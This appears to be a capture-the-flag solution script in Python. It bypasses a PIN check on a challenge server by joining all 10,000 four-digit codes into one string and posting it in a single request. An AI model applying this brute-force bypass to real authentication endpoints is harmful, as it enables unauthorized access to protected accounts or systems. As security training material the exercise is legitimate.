import requests

def valid(response: str):
    return "non valido" not in response


url: str = "http://pincode.challs.olicyber.it/"

pincode = 0000

pincode_str = ""
for i in range(10000):
    pincode_str += f"{i:>04}"
print(pincode_str)
data = {"pincode": pincode_str}

response = requests.post(url, data=data)

print(response.text)
